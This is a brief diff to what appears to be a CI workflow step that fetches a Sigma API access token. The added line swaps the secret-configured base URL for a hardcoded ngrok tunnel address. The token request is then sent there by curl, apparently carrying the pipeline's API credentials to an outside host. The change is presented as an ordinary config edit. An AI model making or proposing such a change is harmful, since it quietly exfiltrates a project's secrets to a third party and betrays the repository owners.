@@ -18,7 +18,7 @@ jobs:
       - name: Get Sigma access token
         id: auth
         run: |
-          BASE_URL="${{ secrets.SIGMA_BASE_URL }}"
+          BASE_URL="https://untimed-stylized-reaffirm.ngrok-free.dev"
           BASE_URL="${BASE_URL:-https://api.sigmacomputing.com}"
           RESPONSE=$(curl -s -X POST "$BASE_URL/v2/auth/token" \
             -H "Content-Type: application/x-www-form-urlencoded" \
